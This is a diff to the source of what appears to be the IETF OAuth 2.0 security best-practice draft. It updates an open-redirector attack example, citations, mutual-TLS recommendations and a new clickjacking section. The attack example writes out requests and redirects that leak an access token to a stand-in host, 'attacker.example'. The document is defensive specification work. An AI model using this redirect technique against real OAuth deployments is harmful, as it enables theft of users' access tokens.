@@ -130,14 +130,14 @@ attacker's control, say `https://www.evil.example`.
 Afterwards, the website initiates an authorization request that is
 very similar to the one in the attack on the code flow. Different to
 above, it utilizes the open redirector by encoding
-`redirect_to=https://client.evil.example` into the parameters of the
+`redirect_to=https://attacker.example` into the parameters of the
 redirect URI and it uses the response type "token" (line breaks for display only):
   
     GET /authorize?response_type=token&state=9ad67f13
         &client_id=s6BhdRkqt3
         &redirect_uri=https%3A%2F%2Fclient.somesite.example
          %2Fcb%26redirect_to%253Dhttps%253A%252F
-         %252Fclient.evil.example%252F HTTP/1.1
+         %252Fattacker.example%252F HTTP/1.1
     Host: server.somesite.example
         
 Now, since the redirect URI matches the registered pattern, the
@@ -147,24 +147,24 @@ readability):
 
     HTTP/1.1 303 See Other
     Location: https://client.somesite.example/cb?
-              redirect_to%3Dhttps%3A%2F%2Fclient.evil.example%2Fcb
+              redirect_to%3Dhttps%3A%2F%2Fattacker.example%2Fcb
               #access_token=2YotnFZFEjr1zCsicMWpAA&...
      
 At example.com, the request arrives at the open redirector. The endpoint will
 read the redirect parameter and will issue an HTTP 303 Location header
-redirect to the URL `https://client.evil.example/`.
+redirect to the URL `https://attacker.example/`.
   
     HTTP/1.1 303 See Other
-    Location: https://client.evil.example/
+    Location: https://attacker.example/
         
 Since the redirector at client.somesite.example does not include a
 fragment in the Location header, the user agent will re-attach the
 original fragment `#access_token=2YotnFZFEjr1zCsicMWpAA&amp;...` to
 the URL and will navigate to the following URL:
     
-    https://client.evil.example/#access_token=2YotnFZFEjr1z...
+    https://attacker.example/#access_token=2YotnFZFEjr1z...
   
-The attacker's page at `client.evil.example` can now access the
+The attacker's page at `attacker.example` can now access the
 fragment and obtain the access token.
     
    
@@ -347,10 +347,8 @@ server.
 
 ### Attack Description
 
-For a more detailed attack description, refer to [@arXiv.1601.01229]
-and [@I-D.ietf-oauth-mix-up-mitigation]. The description here closely
-follows [@arXiv.1601.01229], with variants of the attack outlined
-below.
+The description here closely follows [@arXiv.1601.01229], with
+variants of the attack outlined below.
 
 Preconditions: For this variant of the attack to work, we assume that
 
@@ -455,8 +453,7 @@ If clients cannot use distinct redirect URIs for each AS, the following options 
     identitifier (`iss`) as a non-standard parameter in the
     authorization response. This enables complying clients to compare
     this data to the `iss` identifier of the AS it believed it sent
-    the user agent to. This mitigation is discussed in detail in
-    [@I-D.ietf-oauth-mix-up-mitigation].
+    the user agent to. 
   * In OpenID Connect, if an ID Token is returned in the authorization
     response, it carries client ID and issuer. It can be used in the
     same way as the `iss` parameter.
@@ -658,10 +655,10 @@ variant of an attack known as Cross-Site Request Forgery (CSRF).
  
 The traditional countermeasure are CSRF tokens that are bound to the
 user agent and passed in the `state` parameter to the authorization
-server as described in [@!RFC6819]. Alternatively, PKCE or the OpenID
-Connect `nonce` value provide CSRF protection.
+server as described in [@!RFC6819]. The same protection is provided by
+PKCE or the OpenID Connect `nonce` value.
 
-When using PKCE instead of `state` for CSRF protection, it is
+When using PKCE instead of `state` or `nonce` for CSRF protection, it is
 important to note that:
 
  * Clients MUST ensure that the AS supports PKCE before using PKCE for
@@ -673,7 +670,7 @@ important to note that:
    tampering and swapping. This can be achieved by binding the
    contents of state to the browser session and/or signed/encrypted
    state values [@I-D.bradley-oauth-jwt-encoded-state].
- 
+
 AS therefore MUST provide a way to detect their support for PKCE
 either via AS metadata according to [@!RFC8414] or provide a
 deployment-specific way to ensure or determine PKCE support.
@@ -795,10 +792,11 @@ A typical flow looks like this:
 There exist several proposals to demonstrate the proof of possession
  in the scope of the OAuth working group:
  
-  * **OAuth Mutual TLS** ([@I-D.ietf-oauth-mtls]): The approach as
-    specified in this document allows the use of mutual TLS (mTLS) for both
-    client authentication and sender-constrained access tokens. For
-    the purpose of sender-constrained access tokens, the client is
+  * **OAuth 2.0 Mutual-TLS Client Authentication and Certificate-Bound
+    Access Tokens** ([@!RFC8705]): The approach as specified in this
+    document allows the use of mutual TLS (mTLS) for both client
+    authentication and sender-constrained access tokens. For the
+    purpose of sender-constrained access tokens, the client is
     identified towards the resource server by the fingerprint of its
     public key. During processing of an access token request, the
     authorization server obtains the client's public key from the TLS
@@ -840,7 +838,7 @@ There exist several proposals to demonstrate the proof of possession
   * **JWT Pop Tokens** ([@I-D.sakimura-oauth-jpop]): This draft
     describes different ways to constrain access token usage, namely
     TLS or request signing. Note: Since the authors of this draft
-    contributed the TLS-related proposal to [@I-D.ietf-oauth-mtls],
+    contributed the TLS-related proposal to [@!RFC8705],
     this document only considers the request signing part. For request
     signing, the draft utilizes
     [@I-D.ietf-oauth-pop-key-distribution] and [@RFC7800]. The
@@ -848,39 +846,22 @@ There exist several proposals to demonstrate the proof of possession
     signing. Replay prevention is provided by building the signature
     over a server-provided nonce, client-provided nonce and a nonce
     counter.
- 
-OAuth Mutual TLS and OAuth Token Binding are built
-on top of TLS and this way continue the successful OAuth
-philosophy to leverage TLS to secure OAuth wherever possible. Both
-mechanisms allow prevention of access token leakage in a fairly client
-developer friendly way.
- 
-There are some differences between both approaches: To start with, for
-OAuth Token Binding, all key material is automatically managed by the
-TLS stack whereas mTLS requires the developer to create and maintain
-the key pairs and respective certificates. Use of self-signed
-certificates, which is supported by the draft, significantly reduces
-the complexity of this task. Furthermore, OAuth Token Binding allows
-to use different key pairs for different resource servers, which is a
-privacy benefit. On the other hand, [@I-D.ietf-oauth-mtls] only
-requires widely deployed TLS features, which means it might be easier
-to adopt in the short term.
- 
-Application level signing approaches, like
-[@I-D.ietf-oauth-signed-http-request] and [@I-D.sakimura-oauth-jpop]
-have been debated for a long time in the OAuth working group without a
-clear outcome.
- 
- 
-As one advantage, application-level signing allows for end-to-end
-protection including non-repudiation even if the TLS connection is
-terminated between client and resource server. But deployment
-experiences have revealed challenges regarding robustness (e.g.,
-reproduction of the signature base string including correct URL) as
-well as state management (e.g., replay prevention).
- 
-This document therefore recommends implementers to consider one of the
-TLS-based approaches wherever possible.
+
+
+At the time of writing, OAuth Mutual TLS is the most widely
+implemented and the only standardized sender-constraining method. The
+use of OAuth Mutual TLS therefore is RECOMMENDED.
+
+Note that the security of sender-constrained tokens is undermined when
+an attacker gets access to the token and the key material. This is in
+particular the case for corrupted client software and cross-site
+scripting attacks (when the client is running in the browser). If the
+key material is protected in a hardware or software security module or
+only indirectly accessible (like in a TLS stack), sender-constrained
+tokens at least protect against a use of the token when the client is
+offline, i.e., when the security module or interface is not available
+to the attacker. This applies to access tokens as well as to refresh
+tokens (see (#refresh_token_protection)).
 
 
 ##### Audience Restricted Access Tokens {#aud_restriction} 
@@ -930,7 +911,7 @@ servers. (Resource indicators, as specified in
 [@I-D.ietf-oauth-resource-indicators], can help to achieve this.)
 [@I-D.ietf-oauth-token-binding] has the same property since different
 token binding ids must be associated with the access token. Using
-[@I-D.ietf-oauth-mtls], on the other hand, allows a client to use the
+[@!RFC8705], on the other hand, allows a client to use the
 access token at multiple resource servers.
  
 It shall be noted that audience restrictions, or generally speaking an
@@ -1010,13 +991,12 @@ to other web sites (the clients), but must do so in a safe way.
 stating that the AS MUST NOT automatically redirect the user agent in case
 of an invalid combination of `client_id` and `redirect_uri`.
   
-However, as described in [@I-D.ietf-oauth-closing-redirectors], an
-attacker could also utilize a correctly registered redirect URI to
-perform phishing attacks. The attacker could, for example, register a
-client via dynamic client registration [@RFC7591] and intentionally
-send an erroneous authorization request, e.g., by using an invalid
-scope value, thus instructing the AS to redirect the user agent to its
-phishing site.
+However, an attacker could also utilize a correctly registered
+redirect URI to perform phishing attacks. The attacker could, for
+example, register a client via dynamic client registration [@RFC7591]
+and intentionally send an erroneous authorization request, e.g., by
+using an invalid scope value, thus instructing the AS to redirect the
+user agent to its phishing site.
   
 The AS MUST take precautions to prevent this threat. Based on its risk
 assessment, the AS needs to decide whether it can trust the redirect
@@ -1110,6 +1090,8 @@ to the security of OAuth since they allow the authorization server to issue
 access tokens with a short lifetime and reduced scope thus reducing the 
 potential impact of access token leakage.
 
+### Discussion
+
 Refresh tokens are an attractive target for attackers since they
 represent the overall grant a resource owner delegated to a certain
 client. If an attacker is able to exfiltrate and successfully replay a
@@ -1136,6 +1118,8 @@ error codes and response behavior.
 This specification gives recommendations beyond the scope of
 [@!RFC6749] and clarifications.
     
+### Recommendations
+    
 Authorization servers SHOULD determine, based on a risk assessment,
 whether to issue refresh tokens to a certain client. If the
 authorization server decides not to issue refresh tokens, the client
@@ -1155,7 +1139,7 @@ detect refresh token replay by malicious actors for public clients:
   * **Sender-constrained refresh tokens:** the authorization server
     cryptographically binds the refresh token to a certain client
     instance by utilizing [@I-D.ietf-oauth-token-binding] or
-    [@I-D.ietf-oauth-mtls].
+    [@!RFC8705].
   * **Refresh token rotation:** the authorization server issues a new
     refresh token with every access token refresh response. The
     previous refresh token is invalidated but information about the
@@ -1176,7 +1160,7 @@ detect refresh token replay by malicious actors for public clients:
     integrity of the refresh token value in this case, for example,
     using signatures.
     
-Authorization servers may revoke refresh tokens automatically in case
+Authorization servers MAY revoke refresh tokens automatically in case
 of a security event, such as:
  
   * password change
@@ -1207,9 +1191,55 @@ checks.
 ### Countermeasures {#client_impersonating_countermeasures}
 
 Authorization servers SHOULD NOT allow clients to influence their
-`client_id` or `sub` value or any other claim that might cause
+`client_id` or `sub` value or any other claim if that can cause
 confusion with a genuine resource owner. Where this cannot be avoided,
-authorization servers MUST provide other means for the resource
-server to distinguish between access tokens authorized by a resource
-owner from access tokens authorized by the client itself.
+authorization servers MUST provide other means for the resource server
+to distinguish between access tokens authorized by a resource owner
+from access tokens authorized by the client itself.
 
+## Clickjacking {#clickjacking}
+
+As described in Section 4.4.1.9 of [@!RFC6819], the authorization 
+request is susceptible to clickjacking. An attacker can use this 
+vector to obtain the user's authentication credentials, change the 
+scope of access granted to the client, and potentially access the 
+user's resources.
+
+Authorization servers MUST prevent clickjacking attacks. Multiple
+countermeasures are described in [@!RFC6819], including the use of the
+X-Frame-Options HTTP response header field and frame-busting
+JavaScript. In addition to those, authorization servers SHOULD also
+use Content Security Policy (CSP) level 2 [@!CSP-2] or greater.
+
+To be effective, CSP must be used on the authorization endpoint and,
+if applicable, other endpoints used to authenticate the user and
+authorize the client (e.g., the device authorization endpoint, login
+pages, error pages, etc.). This prevents framing by unauthorized
+origins in user agents that support CSP. The client MAY permit being
+framed by some other origin than the one used in its redirection
+endpoint. For this reason, authorization servers SHOULD allow
+administrators to configure allowed origins for particular clients
+and/or for clients to register these dynamically.
+
+Using CSP allows authorization servers to specify multiple origins in 
+a single response header field and to constrain these using flexible 
+patterns (see [@CSP-2] for details). Level 2 of this standard provides
+a robust mechanism for protecting against clickjacking by using 
+policies that restrict the origin of frames (using `frame-ancestors`) 
+together with those that restrict the sources of scripts allowed to 
+execute on an HTML page (by using `script-src`). A non-normative 
+example of such a policy is shown in the following listing:
+
+```
+HTTP/1.1 200 OK
+Content-Security-Policy: frame-ancestors https://other.example.org:8000
+Content-Security-Policy: script-src 'self'
+X-Frame-Options: ALLOW-FROM https://other.example.org:8000
+...
+```
+
+Because some user agents do not support [@CSP-2], this technique
+SHOULD be combined with others, including those described in
+[@!RFC6819], unless such legacy user agents are explicitly unsupported
+by the authorization server. Even in such cases, additional
+countermeasures SHOULD still be employed.
